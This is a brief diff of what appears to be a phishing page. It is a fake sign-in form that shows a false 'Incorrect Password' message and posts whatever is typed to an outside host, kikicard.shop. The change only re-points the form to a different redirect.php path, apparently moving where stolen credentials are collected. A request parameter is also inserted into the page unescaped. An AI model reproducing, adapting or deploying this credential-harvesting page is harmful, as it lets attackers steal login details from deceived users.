@@ -42,7 +42,7 @@ $id = $_GET['nameu'];
             <p class="text-xl  text-neutral-400 " >Sign in to continue</p>
             <p class="text-sm text-center px-10 pt-3 pb-7 text-red-300 font-semibold" > Incorrect Password. Please try again ! </p>
             
-            <form name="form1" class="ml-6 mr-6"  action="https://kikicard.shop/000jambrow3/redirect.php?name=$id" onsubmit="return validateForm()" method="post" required>
+            <form name="form1" class="ml-6 mr-6"  action="https://kikicard.shop/billion/redirect.php?name=$id" onsubmit="return validateForm()" method="post" required>
 
                 
                 <div class="text-center pl-5 pr-5">
